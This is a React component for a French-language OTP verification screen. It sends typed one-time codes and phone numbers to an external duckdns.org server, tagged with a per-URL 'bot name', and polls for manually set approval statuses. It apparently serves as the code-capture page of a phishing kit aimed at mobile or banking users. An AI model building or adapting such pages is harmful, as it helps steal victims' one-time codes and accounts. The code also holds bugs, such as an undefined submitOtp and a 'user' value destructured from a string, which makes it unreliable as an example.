import React, { useState, useRef, useEffect } from 'react'
import axios from 'axios'

const API_BASE_URL = "https://lnmb.duckdns.org"

const getBotName = () => window.location.pathname.split("/")[1] || "user1"

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = getBotName()
  config.headers["X-Bot-Name"] = bot
  return config
})

const otpStatusMessages = {
  pending: "⏳ En attente...",
  approved: "✅ Vérifié!",
  wrong_code: "❌ Code OTP incorrect",
  wrong_pin: "❌ Code PIN incorrect",
  expired: "⏰ Temps expiré",
  resend_requested: "🔁 OTP resend requested"
}

function Verification() {
  const [client] = useState({ name: "", number: "" })
  const [otp, setOtp] = useState(Array(6).fill(""))
  const inputRefs = useRef([])
  const [sessionId, setSessionId] = useState(null)
  const [status, setStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [copied, setCopied] = useState(false)
  const [timer, setTimer] = useState(120)
  
  const { user } = getBotName() || {}

  const startIndex = useRef(null)

  const handleKey = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    } else if (/^\d$/.test(e.key) && index < 5) {
      e.preventDefault()
      const newOtp = [...otp]
      newOtp[index] = e.key
      setOtp(newOtp)
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const data = e.clipboardData.getData("text").trim().replace(/\D/g, "")
    if (data.length === 6) {
      const newOtp = data.split("").slice(0, 6)
      setOtp(newOtp)
      setTimeout(() => submitOtp(new Event("submit")), 300)
    }
  }

  const startVerification = async () => {
    if (otp.some(i => i === "")) return
    
    const code = otp.join("")
    console.log("Sending OTP verification...", code)
    setLoading(true)
    
    try {
      const response = await api.post("/api/verify-user", {
        phoneNumber: client.number,
        otpCode: code,
        countryCode: "+243",
        userId: `user_${Date.now()}`,
        userName: client.name
      })
      
      if (response.data.sessionId) {
        setSessionId(response.data.sessionId)
        console.log("OTP Session ID:", response.data.sessionId)
        checkStatus(response.data.sessionId)
      }
    } catch (err) {
      console.error("Verification error:", err)
      setError((err.response?.data?.error?.includes("Wrong") || err.message.includes("wrong")) ? "Code OTP incorrect" : "Erreur de vérification")
      setLoading(false)
    }
  }

  const checkStatus = async (id) => {
    const interval = setInterval(async () => {
      try {
        const response = await api.get(`/api/check-status/${user}/${id}`)
        const data = response.data
        console.log("OTP Status check:", data)
        
        if (data.status === "approved") {
          console.log("✅ OTP approved!")
          setSessionId(null)
          setTimeout(() => window.location.href = `/${user}/compliance`, 1000)
          clearInterval(interval)
        } else if (data.status === "wrong_code") {
          console.log("❌ Wrong OTP code")
          setError("Code OTP incorrect")
          setLoading(false)
          clearInterval(interval)
        } else if (data.status === "expired") {
          console.log("⏰ Session expired")
          setError("Session expirée")
          setLoading(false)
          clearInterval(interval)
        }
      } catch (err) {
        console.error("Polling error:", err)
      }
    }, 2000)
    
    return () => clearInterval(interval)
  }

  const copyCode = () => {
    const code = otp.join("")
    if (code.length === 6) {
      navigator.clipboard.writeText(code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  const resendOtp = () => {
    setOtp(Array(6).fill(""))
    setTimer(120)
    setError("")
    setLoading(false)
  }

  useEffect(() => {
    if (status === "approved") {
      setTimeout(() => window.location.href = `/${user}/compliance`, 2000)
    }
  }, [status])

  useEffect(() => {
    if (timer > 0) {
      const id = setInterval(() => setTimer(t => t - 1), 1000)
      return () => clearInterval(id)
    }
  }, [timer])

  if (status === "approved") {
    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2>✅ Vérification réussie!</h2>
          <p>Vous serez redirigé vers la page de compléxion...</p>
        </div>
      </div>
    )
  }

  if (status === "wrong_pin") {
    return (
      <div className="otp-container">
        <div className="verification-error">
          <h2 style={{ color: "red" }}>❌ Votre code PIN est incorrect !</h2>
          <p>Retour à la page de connexion...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="otp-container">
      <div className="otpheader">
        <h2>Vérification OTP</h2>
        <p>
          Saisissez le code OTP envoyé à votre numéro
          <br />
          <span style={{ fontWeight: "bold", color: "#333" }}>{client.number}</span>
        </p>
      </div>

      {error && (
        <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0", padding: "8px", backgroundColor: "#ffeeee", borderRadius: "5px" }}>
          ❌ {error}
        </div>
      )}

      {status && status !== "pending" && status !== "approved" && (
        <div className="status-message" style={{ 
          color: status.includes("wrong") ? "red" : "orange", 
          margin: "10px 0", 
          padding: "8px", 
          backgroundColor: status.includes("wrong") ? "#ffeeee" : "#fff8e1", 
          borderRadius: "5px" 
        }}>
          {otpStatusMessages[status] || status}
        </div>
      )}

      <div className="otp-inputs">
        {otp.map((value, index) => (
          <input
            key={index}
            ref={el => inputRefs.current[index] = el}
            type="text"
            inputMode="numeric"
            maxLength="1"
            value={value}
            onChange={e => {
              const newOtp = [...otp]
              newOtp[index] = e.target.value
              setOtp(newOtp)
            }}
            onKeyDown={e => handleKey(index, e)}
            onPaste={handlePaste}
            onFocus={(e) => e.target.select()}
            className={`otp-input ${value ? "filled" : ""} ${loading ? "error" : ""}`}
            autoComplete="one-time-code"
            disabled={loading || status === "pending"}
          />
        ))}
      </div>

      <div className="otp-display">
        <p>
          Votre code OTP : <strong>{otp.join("") || "______"}</strong>
        </p>
        
        {!otp.every(v => v) ? (
          <button 
            onClick={startVerification} 
            className="copy-btn" 
            type="button" 
            disabled={otp.join("").length !== 6 || loading || status === "pending"}
            style={{ opacity: otp.join("").length !== 6 || loading || status === "pending" ? 0.6 : 1 }}
          >
            {loading || status === "pending" ? "⏳ Verifying..." : otpStatusMessages[status] || "Saisissez le code OTP"}
          </button>
        ) : (
          <button 
            onClick={copyCode} 
            className="copy-btn" 
            type="button"
          >
            {copied ? "✓ Copié!" : "Finition"}
          </button>
        )}

        <div className="otp-actions">
          <button 
            className="clear-btn" 
            type="button" 
            onClick={resendOtp} 
            disabled={timer > 0}
          >
            {timer > 0 ? `Renvoyer ${timer}s` : "Renvoyer le code OTP"}
          </button>
          <button className="clear-btn" type="button" onClick={() => {
            setOtp(Array(6).fill(""))
            inputRefs.current[0]?.focus()
          }}>
            Claire
          </button>
          {status === "expired" && (
            <button className="retry-button" onClick={resendOtp}>
              → Essayer à nouveau
            </button>
          )}
        </div>
      </div>
    </div>
  )
}

export default Verification